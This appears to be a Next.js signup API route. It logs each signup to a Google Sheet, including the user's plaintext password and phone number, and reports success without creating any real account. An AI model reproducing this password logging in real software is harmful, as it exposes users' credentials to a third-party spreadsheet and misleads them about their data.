import { NextResponse } from "next/server";
import { logToGoogleSheet } from "@/lib/googleSheets";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { name, email, phone, password, role, location } = body;

    if (!email || !name) {
      return NextResponse.json(
        { success: false, error: "Name and Email are required." },
        { status: 400 }
      );
    }

    const userAgent = req.headers.get("user-agent") || "Browser";

    // Trigger Google Sheet log (including Phone Number and Password)
    logToGoogleSheet({
      action: "SIGNUP",
      name,
      email,
      phone: phone || "+91 98765 43210",
      password: password || "••••••••",
      role: role || "Software Engineer",
      location: location || "Bangalore, Remote",
      userAgent,
      timestamp: new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }),
    });

    return NextResponse.json({
      success: true,
      message: "Account created successfully.",
      user: {
        id: "user_" + Date.now(),
        name,
        email,
        phone: phone || "+91 98765 43210",
        currentRole: role || "Software Engineer",
        location: location || "Bangalore, Remote",
      },
    });
  } catch (error: any) {
    console.error("Signup API error:", error);
    return NextResponse.json(
      { success: false, error: "Server error during account creation." },
      { status: 500 }
    );
  }
}
